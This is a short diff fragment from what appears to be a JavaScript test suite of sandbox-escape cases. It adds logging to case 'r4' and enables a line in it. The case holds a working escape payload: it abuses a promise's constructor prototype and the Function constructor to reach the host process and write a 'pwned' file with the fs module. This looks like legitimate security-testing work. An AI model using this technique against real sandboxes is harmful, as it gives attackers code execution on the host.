@@ -1056,7 +1056,11 @@ p.then();
 var case_id= 'r4';
 var code=`
 let i=import('').catch(_=>_);
-//delete i.constructor;//even delete and wait for rebuild from __proto__
+console.log('r4 i',i);
+console.log('r4 i.__proto__',i.__proto__);
+console.log('r4 i.constructor',i.constructor);
+delete i.constructor;//even delete and wait for rebuild from __proto__
+console.log('r4 i.constructor',i.constructor);
 let pc=i.constructor;
 pc.__proto__ = {
         set constructor(f) { f("return process")().mainModule.require("fs").writeFileSync("pwned_${case_id}", "");}
